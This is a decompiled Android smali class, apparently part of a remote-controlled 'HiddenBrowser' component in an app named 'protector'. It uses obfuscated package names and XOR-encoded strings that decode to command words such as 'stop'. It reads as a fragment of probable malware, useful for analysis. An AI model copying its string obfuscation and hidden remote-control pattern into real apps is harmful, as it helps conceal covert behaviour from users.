.class Lcom/icontrol/protector/HiddenBrowser$h;
.super Lntidisestablish/neumonoul/floccinaucinih/o70;
.source "SourceFile"


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lcom/icontrol/protector/HiddenBrowser;->b(Landroid/content/Context;Ljava/lang/String;)V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic a:Landroid/content/Context;

.field final synthetic b:Ljava/lang/String;

.field final synthetic c:Lcom/icontrol/protector/HiddenBrowser;


# direct methods
.method constructor <init>(Lcom/icontrol/protector/HiddenBrowser;Landroid/content/Context;Ljava/lang/String;)V
    .locals 0

    iput-object p1, p0, Lcom/icontrol/protector/HiddenBrowser$h;->c:Lcom/icontrol/protector/HiddenBrowser;

    iput-object p2, p0, Lcom/icontrol/protector/HiddenBrowser$h;->a:Landroid/content/Context;

    iput-object p3, p0, Lcom/icontrol/protector/HiddenBrowser$h;->b:Ljava/lang/String;

    invoke-direct {p0}, Lntidisestablish/neumonoul/floccinaucinih/o70;-><init>()V

    return-void
.end method


# virtual methods
.method public a(Lntidisestablish/neumonoul/floccinaucinih/m70;ILjava/lang/String;)V
    .locals 0

    .line 1
    iget-object p1, p0, Lcom/icontrol/protector/HiddenBrowser$h;->c:Lcom/icontrol/protector/HiddenBrowser;

    const/4 p2, 0x0

    invoke-static {p1, p2}, Lcom/icontrol/protector/HiddenBrowser;->k(Lcom/icontrol/protector/HiddenBrowser;Lntidisestablish/neumonoul/floccinaucinih/m70;)Lntidisestablish/neumonoul/floccinaucinih/m70;

    iget-object p1, p0, Lcom/icontrol/protector/HiddenBrowser$h;->c:Lcom/icontrol/protector/HiddenBrowser;

    invoke-static {p1}, Lcom/icontrol/protector/HiddenBrowser;->l(Lcom/icontrol/protector/HiddenBrowser;)Lntidisestablish/neumonoul/floccinaucinih/ks;

    move-result-object p1

    invoke-virtual {p1}, Lntidisestablish/neumonoul/floccinaucinih/ks;->o()Lntidisestablish/neumonoul/floccinaucinih/ce;

    move-result-object p1

    invoke-virtual {p1}, Lntidisestablish/neumonoul/floccinaucinih/ce;->c()Ljava/util/concurrent/ExecutorService;

    move-result-object p1

    invoke-interface {p1}, Ljava/util/concurrent/ExecutorService;->shutdown()V

    return-void
.end method

.method public c(Lntidisestablish/neumonoul/floccinaucinih/m70;Ljava/lang/Throwable;Lntidisestablish/neumonoul/floccinaucinih/dy;)V
    .locals 0

    .line 1
    invoke-virtual {p2}, Ljava/lang/Throwable;->printStackTrace()V

    iget-object p1, p0, Lcom/icontrol/protector/HiddenBrowser$h;->c:Lcom/icontrol/protector/HiddenBrowser;

    const/4 p2, 0x0

    invoke-static {p1, p2}, Lcom/icontrol/protector/HiddenBrowser;->k(Lcom/icontrol/protector/HiddenBrowser;Lntidisestablish/neumonoul/floccinaucinih/m70;)Lntidisestablish/neumonoul/floccinaucinih/m70;

    return-void
.end method

.method public d(Lntidisestablish/neumonoul/floccinaucinih/m70;Ljava/lang/String;)V
    .locals 4

    .line 1
    :try_start_0
    new-instance p1, Lorg/json/JSONObject;

    invoke-direct {p1, p2}, Lorg/json/JSONObject;-><init>(Ljava/lang/String;)V

    const/4 p2, 0x4

    new-array v0, p2, [B

    fill-array-data v0, :array_0

    const/16 v1, 0x8

    new-array v2, v1, [B

    fill-array-data v2, :array_1

    invoke-static {v0, v2}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v0

    const/4 v2, 0x5

    new-array v2, v2, [B

    fill-array-data v2, :array_2

    new-array v3, v1, [B

    fill-array-data v3, :array_3

    invoke-static {v2, v3}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {p1, v0, v2}, Lorg/json/JSONObject;->optString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object p1

    new-array p2, p2, [B

    fill-array-data p2, :array_4

    new-array v0, v1, [B

    fill-array-data v0, :array_5

    invoke-static {p2, v0}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object p2

    invoke-virtual {p1, p2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result p2

    if-nez p2, :cond_0

    const/16 p2, 0x13

    new-array p2, p2, [B

    fill-array-data p2, :array_6

    new-array v0, v1, [B

    fill-array-data v0, :array_7

    invoke-static {p2, v0}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object p2

    invoke-virtual {p1, p2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result p1

    if-eqz p1, :cond_1

    :cond_0
    iget-object p1, p0, Lcom/icontrol/protector/HiddenBrowser$h;->c:Lcom/icontrol/protector/HiddenBrowser;

    const/4 p2, 0x0

    invoke-static {p1, p2}, Lcom/icontrol/protector/HiddenBrowser;->k(Lcom/icontrol/protector/HiddenBrowser;Lntidisestablish/neumonoul/floccinaucinih/m70;)Lntidisestablish/neumonoul/floccinaucinih/m70;

    iget-object p1, p0, Lcom/icontrol/protector/HiddenBrowser$h;->c:Lcom/icontrol/protector/HiddenBrowser;

    invoke-static {p1}, Lcom/icontrol/protector/HiddenBrowser;->l(Lcom/icontrol/protector/HiddenBrowser;)Lntidisestablish/neumonoul/floccinaucinih/ks;

    move-result-object p1

    invoke-virtual {p1}, Lntidisestablish/neumonoul/floccinaucinih/ks;->o()Lntidisestablish/neumonoul/floccinaucinih/ce;

    move-result-object p1

    invoke-virtual {p1}, Lntidisestablish/neumonoul/floccinaucinih/ce;->c()Ljava/util/concurrent/ExecutorService;

    move-result-object p1

    invoke-interface {p1}, Ljava/util/concurrent/ExecutorService;->shutdown()V

    iget-object p1, p0, Lcom/icontrol/protector/HiddenBrowser$h;->c:Lcom/icontrol/protector/HiddenBrowser;

    iget-object p2, p0, Lcom/icontrol/protector/HiddenBrowser$h;->a:Landroid/content/Context;

    invoke-virtual {p1, p2}, Lcom/icontrol/protector/HiddenBrowser;->c(Landroid/content/Context;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :catch_0
    :cond_1
    return-void

    :array_0
    .array-data 1
        0x71t
        0x59t
        0x41t
        0x41t
    .end array-data

    :array_1
    .array-data 1
        0x5t
        0x20t
        0x31t
        0x24t
        -0x61t
        -0x15t
        -0x4t
        0x6ct
    .end array-data

    :array_2
    .array-data 1
        0x14t
        0x31t
        0x45t
        0x70t
        0x32t
    .end array-data

    nop

    :array_3
    .array-data 1
        0x71t
        0x5ct
        0x35t
        0x4t
        0x4bt
        0x24t
        0xft
        -0x3et
    .end array-data

    :array_4
    .array-data 1
        -0x51t
        -0x10t
        -0x32t
        0x7at
    .end array-data

    :array_5
    .array-data 1
        -0x24t
        -0x7ct
        -0x5ft
        0xat
        0x67t
        -0x26t
        0x5ct
        0x77t
    .end array-data

    :array_6
    .array-data 1
        0x13t
        0x60t
        -0x15t
        0x44t
        -0x20t
        -0x2bt
        -0x6dt
        0x0t
        0x2ft
        0x74t
        -0x11t
        0x55t
        -0x4ct
        -0x24t
        -0x61t
        0x11t
        0x23t
        0x7dt
        -0x7t
    .end array-data

    :array_7
    .array-data 1
        0x46t
        0xet
        -0x76t
        0x31t
        -0x6ct
        -0x43t
        -0x4t
        0x72t
    .end array-data
.end method

.method public f(Lntidisestablish/neumonoul/floccinaucinih/m70;Lntidisestablish/neumonoul/floccinaucinih/dy;)V
    .locals 1

    .line 1
    iget-object p1, p0, Lcom/icontrol/protector/HiddenBrowser$h;->c:Lcom/icontrol/protector/HiddenBrowser;

    iget-object p2, p0, Lcom/icontrol/protector/HiddenBrowser$h;->a:Landroid/content/Context;

    iget-object v0, p0, Lcom/icontrol/protector/HiddenBrowser$h;->b:Ljava/lang/String;

    invoke-static {p1, p2, v0}, Lcom/icontrol/protector/HiddenBrowser;->j(Lcom/icontrol/protector/HiddenBrowser;Landroid/content/Context;Ljava/lang/String;)V

    return-void
.end method
